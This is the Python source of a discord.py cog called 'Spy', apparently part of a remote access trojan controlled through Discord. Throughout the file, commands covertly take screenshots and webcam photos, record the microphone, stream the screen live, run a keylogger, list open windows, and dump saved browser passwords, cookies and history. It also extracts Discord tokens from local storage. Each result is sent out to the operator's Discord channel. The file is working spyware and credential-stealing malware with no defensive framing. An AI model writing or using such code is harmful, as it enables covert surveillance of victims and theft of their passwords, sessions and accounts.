import asyncio, io
import discord
from discord.ext import commands
from core import capture, keylog, browser, web
from core.util import code, say, run_ps


class Spy(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['ss'])
    async def screen(self, ctx, mon: int = 1):
        b = await asyncio.to_thread(capture.STREAM.snap_bytes, mon)
        await ctx.channel.send(file=discord.File(io.BytesIO(b), 'screen.png'))

    @commands.command()
    async def screens(self, ctx):
        await code(ctx.channel, '\n'.join(f'{m["i"]}: {m["w"]}x{m["h"]}' for m in await asyncio.to_thread(capture.monitors)))

    @commands.command()
    async def stream(self, ctx, action: str = 'start'):
        if action == 'stop':
            await web.stop()
            return await say(ctx.channel, 'stopped')
        if web.running():
            return await say(ctx.channel, web.URL or 'running')
        url = await web.start(self.bot.cfg['web_port'], self.bot.cfg['web_token'], self.bot.cfg)
        await say(ctx.channel, f'**LIVE** {url}' if url else 'tunnel failed')

    @commands.command()
    async def cam(self, ctx):
        try:
            import cv2
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            ok, fr = cap.read()
            cap.release()
            if not ok:
                raise RuntimeError('no camera')
            ok, jpg = cv2.imencode('.jpg', fr, [cv2.IMWRITE_JPEG_QUALITY, 72])
            await ctx.channel.send(file=discord.File(io.BytesIO(jpg.tobytes()), 'cam.jpg'))
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    @commands.command()
    async def mic(self, ctx, secs: int = 8):
        try:
            import sounddevice as sd, soundfile as sf
            rec = await asyncio.to_thread(sd.rec, int(secs * 16000), samplerate=16000, channels=1)
            buf = io.BytesIO()
            sf.write(buf, rec, 16000, format='WAV')
            buf.seek(0)
            await ctx.channel.send(file=discord.File(buf, 'mic.wav'))
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    @commands.command()
    async def keys(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(keylog.read))

    @commands.command()
    async def keys_start(self, ctx):
        await say(ctx.channel, 'on' if await asyncio.to_thread(keylog.start) else 'already on')

    @commands.command()
    async def keys_stop(self, ctx):
        keylog.stop()
        await say(ctx.channel, 'off')

    @commands.command()
    async def keys_clear(self, ctx):
        keylog.clear()
        await say(ctx.channel, 'cleared')

    @commands.command()
    async def active(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();'
            '[DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int c);\' '
            '-Name W -Namespace U;$s=New-Object Text.StringBuilder 512;'
            '[U.W]::GetWindowText([U.W]::GetForegroundWindow(),$s,512);$s.ToString()'))

    @commands.command()
    async def windows(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-Process|? MainWindowTitle|Select Id,MainWindowTitle|ft -AutoSize|Out-String -Width 200'))

    @commands.command()
    async def passwords(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(browser.passwords))

    @commands.command()
    async def cookies(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(browser.cookies))

    @commands.command()
    async def history(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(browser.history))

    @commands.command()
    async def dtoken(self, ctx):
        import pathlib, os, re
        out = []
        for lvl in ('Local Storage', 'leveldb'):
            d = pathlib.Path(os.getenv('APPDATA')) / 'discord' / lvl
            if not d.exists():
                continue
            for f in d.glob('*.ldb'):
                for m in re.finditer(rb'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)', f.read_bytes()):
                    out.append(m.group(1).decode())
        await code(ctx.channel, '\n'.join(dict.fromkeys(out))[:4000] or 'none')


async def setup(bot):
    await bot.add_cog(Spy(bot))